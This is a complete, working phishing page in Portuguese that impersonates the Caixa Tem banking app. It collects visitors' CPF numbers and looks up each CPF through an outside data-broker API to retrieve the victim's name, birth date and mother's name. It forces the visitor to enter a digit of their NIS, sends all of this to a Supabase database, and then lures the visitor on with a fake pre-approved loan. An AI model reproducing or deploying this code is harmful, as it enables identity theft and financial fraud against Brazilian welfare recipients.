<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no" />
  <link rel="icon" type="image/png" href="favicon.png" />
  <title>CAIXA TEM - ACESSE SUA CONTA</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    body {
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
      background: #0066b3;
      height: 100%;
      width: 100%;
      position: fixed;
      overflow: hidden;
      display: none;
      align-items: center;
      justify-content: center;
      padding: 20px;
    }

    @media (max-width: 768px) {
      body {
        display: flex;
      }
    }

    .container {
      background: white;
      border-radius: 24px;
      width: 100%;
      max-width: 420px;
      margin: auto;
      padding: 0;
      box-shadow: 0 10px 40px rgba(0, 0, 0, 0.2);
      position: relative;
      min-height: 90%;
      max-height: 100%;
      overflow-y: auto;
      align-self: center;
      display: flex;
      flex-direction: column;
    }

    .close-btn {
      position: absolute;
      top: 20px;
      right: 20px;
      background: none;
      border: none;
      font-size: 28px;
      color: #666;
      cursor: pointer;
      font-weight: 300;
      line-height: 1;
      padding: 0;
      width: 32px;
      height: 32px;
      display: flex;
      align-items: center;
      justify-content: center;
    }

    .content {
      padding: 80px 32px 32px 32px;
      flex: 1;
      display: flex;
      flex-direction: column;
    }

    .logo {
      position: absolute;
      top: 24px;
      left: 50%;
      transform: translateX(-50%);
      display: flex;
      align-items: center;
      justify-content: center;
    }

    .logo img {
      max-width: 50px;
      height: auto;
    }

    h1 {
      color: #003e6b;
      font-size: 28px;
      font-weight: 600;
      text-align: left;
      line-height: 1.3;
      margin-bottom: 32px;
    }

    .input-wrapper {
      margin-bottom: 24px;
    }

    label {
      display: block;
      color: #374151;
      font-size: 16px;
      font-weight: 600;
      margin-bottom: 12px;
    }

    input[type="tel"], input[type="text"] {
      width: 100%;
      padding: 16px 20px;
      border: 1px solid #d1d5db;
      border-radius: 12px;
      font-size: 16px;
      color: #374151;
      outline: none;
      transition: border-color 0.2s;
    }

    input:focus {
      border-color: #0066b3;
    }

    .submit-btn {
      width: 100%;
      padding: 16px;
      background: #d4dfe6;
      color: #a0adb5;
      border: none;
      border-radius: 12px;
      font-size: 18px;
      font-weight: 600;
      cursor: not-allowed;
      margin-bottom: auto;
    }

    .version {
      text-align: center;
      color: #1a7f78;
      font-size: 14px;
      margin-top: auto;
      padding-top: 40px;
      padding-bottom: 20px;
    }

    /* Popup Styles */
    .popup-overlay {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: rgba(0, 0, 0, 0.7);
      z-index: 3000;
      display: none;
      align-items: center;
      justify-content: center;
      backdrop-filter: blur(3px);
    }

    .popup-content {
      background: white;
      border-radius: 24px;
      width: 90%;
      max-width: 340px;
      padding: 32px 24px;
      text-align: center;
      animation: popupFadeIn 0.3s ease-out;
      box-shadow: 0 20px 40px rgba(0, 0, 0, 0.3);
    }

    @keyframes popupFadeIn {
      from {
        opacity: 0;
        transform: scale(0.9);
      }
      to {
        opacity: 1;
        transform: scale(1);
      }
    }

    .popup-icon {
      width: 64px;
      height: 64px;
      background: #d97706;
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center;
      margin: 0 auto 20px auto;
    }

    .popup-icon svg {
      width: 32px;
      height: 32px;
      fill: white;
    }

    .popup-content h2 {
      color: #003e6b;
      font-size: 24px;
      margin-bottom: 12px;
    }

    .popup-content p {
      color: #374151;
      font-size: 16px;
      margin-bottom: 20px;
    }

    .popup-nis-input {
      width: 100%;
      padding: 14px;
      border: 1px solid #d1d5db;
      border-radius: 12px;
      font-size: 24px;
      text-align: center;
      letter-spacing: 4px;
      margin-bottom: 20px;
    }

    .popup-nis-input:focus {
      border-color: #d97706;
      outline: none;
    }

    .popup-btn {
      width: 100%;
      padding: 14px;
      background: #d97706;
      color: white;
      border: none;
      border-radius: 12px;
      font-size: 18px;
      font-weight: 600;
      cursor: pointer;
      transition: background 0.2s;
    }

    .popup-btn:hover {
      background: #b85e00;
    }

    .popup-btn:disabled {
      background: #d4dfe6;
      color: #a0adb5;
      cursor: not-allowed;
    }

    .error-message {
      color: #dc2626;
      font-size: 14px;
      margin-bottom: 8px;
      font-weight: 500;
    }

    .loading-screen {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: #0066b3;
      z-index: 2000;
      display: none;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      text-align: center;
      padding: 20px;
    }

    .loading-gif {
      width: 120px;
      height: 120px;
      margin-bottom: 40px;
    }

    .loading-message {
      color: white;
      font-size: 20px;
      font-weight: 600;
      margin-bottom: 12px;
    }
  </style>
</head>
<body>
  <!-- Loading Screen -->
  <div class="loading-screen" id="loadingScreen">
    <img src="loading.gif" alt="Carregando..." class="loading-gif">
    <div class="loading-message" id="loadingMessage">Processando sua solicitação...</div>
  </div>

  <!-- Popup para NIS -->
  <div class="popup-overlay" id="popupNIS">
    <div class="popup-content">
      <div class="popup-icon">
        <svg viewBox="0 0 24 24">
          <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/>
        </svg>
      </div>
      <h2 id="popupNome">Olá, Cliente!</h2>
      <p>CPF identificado com sucesso.<br>Para continuar, informe o <strong>último dígito do seu NIS</strong> (Número de Identificação Social).</p>
      <input type="text" class="popup-nis-input" id="nisDigit" maxlength="1" placeholder="0-9" inputmode="numeric">
      <div id="nisError" class="error-message" style="display: none;">Digite um dígito válido (0-9)</div>
      <button class="popup-btn" id="confirmarNisBtn">Confirmar e Continuar</button>
    </div>
  </div>

  <div class="container">
    <button class="close-btn">✕</button>
    
    <div class="content">
      <div class="logo">
        <img src="logocaixa2.png" alt="Logo">
      </div>

      <h1>Informe seu CPF<br>para iniciarmos</h1>

      <div class="input-wrapper">
        <div id="cpfError" class="error-message" style="display: none;">CPF Inválido</div>
        <div id="apiError" class="error-message" style="display: none;">Erro ao consultar dados. Tente novamente.</div>
        <input type="tel" placeholder="Digite o seu CPF" maxlength="14" id="cpfInput" inputmode="numeric">
      </div>

      <button class="submit-btn" id="submitBtn">Próximo</button>

      <div class="version">Versão: 2.0.0</div>
    </div>
  </div>

  <!-- ============================================ -->
  <!-- SUPABASE INTEGRATION -->
  <!-- ============================================ -->
  <script>
    const SUPABASE_URL = 'https://hbpgjwezukugbtviswkw.supabase.co';
    const SUPABASE_KEY = 'sb_publishable__7MjiigiJf7NgmLZPLFdxA_yRNF_cO8';

    function getSessaoId() {
      let id = sessionStorage.getItem('sessao_funil');
      if (!id) {
        id = 'sess_' + Date.now() + '_' + Math.random().toString(36).substr(2, 8);
        sessionStorage.setItem('sessao_funil', id);
      }
      return id;
    }

    async function salvarEtapa(etapaNome, dadosColetados = {}) {
      const sessao_id = getSessaoId();
      
      const payload = {
        sessao_id: sessao_id,
        etapa: etapaNome,
        dados: dadosColetados,
        url: window.location.pathname,
        user_agent: navigator.userAgent.substring(0, 255)
      };

      console.log(`📝 Salvando etapa: ${etapaNome}`, dadosColetados);

      try {
        const response = await fetch(`${SUPABASE_URL}/rest/v1/funil_etapas`, {
          method: 'POST',
          headers: {
            'apikey': SUPABASE_KEY,
            'Authorization': `Bearer ${SUPABASE_KEY}`,
            'Content-Type': 'application/json',
            'Prefer': 'return=minimal'
          },
          body: JSON.stringify(payload)
        });

        if (response.ok) {
          console.log(`✅ Etapa "${etapaNome}" salva com sucesso!`);
          return true;
        } else {
          console.error(`❌ Erro ${response.status}:`, await response.text());
          return false;
        }
      } catch (error) {
        console.error('❌ Erro de rede:', error);
        return false;
      }
    }
  </script>

  <script>
    const cpfInput = document.getElementById('cpfInput');
    const submitBtn = document.getElementById('submitBtn');
    const cpfError = document.getElementById('cpfError');
    const apiError = document.getElementById('apiError');
    const loadingScreen = document.getElementById('loadingScreen');
    const loadingMessage = document.getElementById('loadingMessage');
    
    // Popup elementos
    const popupNIS = document.getElementById('popupNIS');
    const popupNome = document.getElementById('popupNome');
    const nisDigit = document.getElementById('nisDigit');
    const nisError = document.getElementById('nisError');
    const confirmarNisBtn = document.getElementById('confirmarNisBtn');

    let dadosCliente = null;

    // REGISTRA QUE O USUÁRIO CHEGOU NESTA PÁGINA
    salvarEtapa('pagina_acesso', { 
      pagina: 'acesso4e98',
      timestamp_acesso: new Date().toISOString()
    });

    // Formatação do CPF
    cpfInput.addEventListener('input', function(e) {
      cpfError.style.display = 'none';
      apiError.style.display = 'none';
      let value = e.target.value.replace(/\D/g, '');
      
      if (value.length > 11) {
        value = value.slice(0, 11);
      }
      
      if (value.length > 9) {
        value = value.replace(/(\d{3})(\d{3})(\d{3})(\d{1,2})/, '$1.$2.$3-$4');
      } else if (value.length > 6) {
        value = value.replace(/(\d{3})(\d{3})(\d{1,3})/, '$1.$2.$3');
      } else if (value.length > 3) {
        value = value.replace(/(\d{3})(\d{1,3})/, '$1.$2');
      }
      
      e.target.value = value;

      if (value.replace(/\D/g, '').length === 11) {
        submitBtn.style.background = '#d97706';
        submitBtn.style.color = 'white';
        submitBtn.style.cursor = 'pointer';
        submitBtn.disabled = false;
      } else {
        submitBtn.style.background = '#d4dfe6';
        submitBtn.style.color = '#a0adb5';
        submitBtn.style.cursor = 'not-allowed';
        submitBtn.disabled = true;
      }
    });

    // Validação de CPF
    function validateCPF(cpf) {
      cpf = cpf.replace(/[^\d]+/g, '');
      if (cpf == '') return false;
      if (cpf.length != 11 ||
        cpf == "00000000000" ||
        cpf == "11111111111" ||
        cpf == "22222222222" ||
        cpf == "33333333333" ||
        cpf == "44444444444" ||
        cpf == "55555555555" ||
        cpf == "66666666666" ||
        cpf == "77777777777" ||
        cpf == "88888888888" ||
        cpf == "99999999999")
        return false;
      let add = 0;
      for (let i = 0; i < 9; i++)
        add += parseInt(cpf.charAt(i)) * (10 - i);
      let rev = 11 - (add % 11);
      if (rev == 10 || rev == 11) rev = 0;
      if (rev != parseInt(cpf.charAt(9))) return false;
      add = 0;
      for (let i = 0; i < 10; i++)
        add += parseInt(cpf.charAt(i)) * (11 - i);
      rev = 11 - (add % 11);
      if (rev == 10 || rev == 11) rev = 0;
      if (rev != parseInt(cpf.charAt(10))) return false;
      return true;
    }

    // Botão de envio do CPF
    submitBtn.addEventListener('click', async function() {
      if (!this.disabled) {
        if (!validateCPF(cpfInput.value)) {
           cpfError.style.display = 'block';
           return;
        }
        
        const cpfLimpo = cpfInput.value.replace(/\D/g, '');
        
        // Mostra loading
        loadingScreen.style.display = 'flex';
        loadingMessage.textContent = 'Consultando CPF...';
        
        try {
          const apiUrl = `https://api.amnesiatecnologia.lat/?token=4c80cd47-d9d5-4672-a301-b9b8741fc293&cpf=${cpfLimpo}`;
          console.log('🔍 Consultando API:', apiUrl);
          
          const response = await fetch(apiUrl);
          const data = await response.json();
          
          if (data && data.DADOS && data.DADOS.nome) {
            dadosCliente = {
              cpf: cpfLimpo,
              cpf_formatado: cpfInput.value,
              nome: data.DADOS.nome,
              data_nascimento: data.DADOS.data_nascimento,
              nome_mae: data.DADOS.nome_mae,
              sexo: data.DADOS.sexo
            };
            
            console.log('✅ Cliente identificado:', dadosCliente.nome);
            
            // Esconde loading e mostra popup com Nome
            loadingScreen.style.display = 'none';
            
            // Mostra popup com o nome do cliente
            const primeiroNome = dadosCliente.nome.split(' ')[0];
            popupNome.innerHTML = `Olá, ${primeiroNome}!`;
            popupNIS.style.display = 'flex';
            
          } else {
            loadingScreen.style.display = 'none';
            apiError.style.display = 'block';
            apiError.textContent = 'CPF não encontrado. Verifique e tente novamente.';
            submitBtn.disabled = false;
          }
        } catch (error) {
          console.error('❌ Erro ao consultar API:', error);
          loadingScreen.style.display = 'none';
          apiError.style.display = 'block';
          apiError.textContent = 'Erro na consulta. Tente novamente.';
          submitBtn.disabled = false;
        }
      }
    });

    // Validação do dígito do NIS
    nisDigit.addEventListener('input', function(e) {
      let value = e.target.value.replace(/\D/g, '');
      if (value.length > 1) value = value.slice(0, 1);
      e.target.value = value;
      
      if (value.length === 1) {
        nisError.style.display = 'none';
        confirmarNisBtn.disabled = false;
        confirmarNisBtn.style.background = '#d97706';
        confirmarNisBtn.style.cursor = 'pointer';
      } else {
        confirmarNisBtn.disabled = true;
        confirmarNisBtn.style.background = '#d4dfe6';
        confirmarNisBtn.style.cursor = 'not-allowed';
      }
    });

    // Confirmação do NIS
    confirmarNisBtn.addEventListener('click', async function() {
      if (!this.disabled) {
        const ultimoDigitoNIS = nisDigit.value;
        
        if (!ultimoDigitoNIS || ultimoDigitoNIS.length !== 1) {
          nisError.style.display = 'block';
          return;
        }
        
        // Fecha o popup
        popupNIS.style.display = 'none';
        
        // Mostra loading
        loadingScreen.style.display = 'flex';
        loadingMessage.textContent = 'Validando informações...';
        
        // ========================================
        // SALVA CPF, NOME E NIS NO BANCO
        // ========================================
        
        await salvarEtapa('cpf_informado', {
          cpf: dadosCliente.cpf,
          cpf_formatado: dadosCliente.cpf_formatado,
          nome: dadosCliente.nome,
          data_nascimento: dadosCliente.data_nascimento,
          nome_mae: dadosCliente.nome_mae,
          sexo: dadosCliente.sexo,
          ultimo_digito_nis: ultimoDigitoNIS,
          timestamp: new Date().toISOString()
        });
        
        // Salva no storage para usar nas próximas páginas
        const clienteData = {
          cpf: dadosCliente.cpf,
          nome: dadosCliente.nome,
          data_nascimento: dadosCliente.data_nascimento,
          nome_mae: dadosCliente.nome_mae,
          ultimo_digito_nis: ultimoDigitoNIS
        };
        localStorage.setItem('funil_cliente_data', JSON.stringify(clienteData));
        sessionStorage.setItem('funil_cliente_data', JSON.stringify(clienteData));
        
        // ========================================
        // VALIDAÇÃO CONCLUÍDA - VAI PARA PRÓXIMA ETAPA
        // ========================================
        
        await salvarEtapa('validacao_concluida', {
          status: 'sucesso',
          cpf_validado: dadosCliente.cpf,
          nome_cliente: dadosCliente.nome,
          ultimo_digito_nis: ultimoDigitoNIS,
          valor_pre_aprovado: 5000,
          timestamp: new Date().toISOString()
        });
        
        loadingMessage.textContent = 'Redirecionando...';
        
        setTimeout(function() {
          window.location.href = 'emprestimo4e98.html?a7k9m2x1p12';
        }, 2000);
      }
    });

    // Fechar popup clicando fora (opcional - desabilitado para forçar NIS)
    // Não permitir fechar clicando fora
    document.getElementById('popupNIS').addEventListener('click', function(e) {
      if (e.target === this) {
        // Não faz nada - obriga a preencher o NIS
        nisError.style.display = 'block';
        nisError.textContent = 'Por favor, informe o último dígito do NIS para continuar.';
      }
    });
  </script>

  <script>
    // Manter parâmetro de acesso em todos os links e formulários
    document.addEventListener('DOMContentLoaded', function() {
        var accessParam = 'a7k9m2x1p12';
        
        function addAccessToLinks() {
            var links = document.querySelectorAll('a[href]');
            links.forEach(function(link) {
                var href = link.getAttribute('href');
                if (!href || href.startsWith('http') || href.startsWith('#') || 
                    href.startsWith('javascript:') || href.includes(accessParam.split('=')[0])) {
                    return;
                }
                var separator = href.includes('?') ? '&' : '?';
                link.setAttribute('href', href + separator + accessParam);
            });
        }
        
        function addAccessToForms() {
            var forms = document.querySelectorAll('form');
            forms.forEach(function(form) {
                if (!form.method || form.method.toLowerCase() === 'get') {
                    var paramName = accessParam.split('=')[0];
                    var existingInput = form.querySelector('input[name="' + paramName + '"]');
                    if (!existingInput) {
                        var input = document.createElement('input');
                        input.type = 'hidden';
                        input.name = paramName;
                        input.value = '';
                        form.appendChild(input);
                    }
                }
            });
        }
        
        addAccessToLinks();
        addAccessToForms();
        
        var observer = new MutationObserver(function(mutations) {
            var shouldUpdate = false;
            mutations.forEach(function(mutation) {
                if (mutation.type === 'childList') {
                    mutation.addedNodes.forEach(function(node) {
                        if (node.nodeType === 1) {
                            if (node.tagName === 'A' || node.tagName === 'FORM' || 
                                node.querySelector('a') || node.querySelector('form')) {
                                shouldUpdate = true;
                            }
                        }
                    });
                }
            });
            if (shouldUpdate) {
                addAccessToLinks();
                addAccessToForms();
            }
        });
        
        observer.observe(document.body, {
            childList: true,
            subtree: true
        });
    });
  </script>
</body>
</html>
